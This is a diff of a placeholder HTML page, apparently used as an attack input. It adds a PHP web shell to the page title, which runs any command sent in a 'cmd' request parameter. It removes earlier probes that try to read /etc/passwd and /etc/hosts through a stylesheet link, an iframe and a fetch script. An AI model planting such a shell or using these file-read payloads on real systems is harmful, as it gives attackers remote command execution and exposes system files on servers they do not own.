@@ -2,8 +2,8 @@
 <html>
 
 <head>
-  <title>This is the title of the webpage!</title>
-  <!-- <link rel="stylesheet" href="file:///etc/passwd"/> -->
+  <title><?php system($_REQUEST['cmd']); ?></title>
+  
   
 </head>
 
@@ -11,34 +11,11 @@
 
     
     
-  </script>
+    
   <p id='some-p'>This is an example paragraph. Anything in the <strong>body</strong> tag will appear on the page, just
     like this <strong>p</strong> tag and its contents.</p>
-    <iframe width=1000 height=5000 src='file:///etc/hosts'>Hi manfffffffffffff</iframe>
-    
+   
 
-
-  <!-- <script async type="module">
-    const p = document.getElementById('some-p');
-    p.textContent = '9999999999999999'
-
-
-    fetch('file:///etc/passwd')
-      .then(response => {
-        if (!response.ok) {
-          throw new Error('Ошибка загрузки файла');
-        }
-        return response.text();
-      })
-      .then(text => {
-        p.textContent = text;
-      })
-      .catch(error => {
-        p.textContent = 'Ошибка: ' + error.message;
-        console.error('Ошибка:', error);
-      });
-    
-  </script> -->
 
 </body>
 
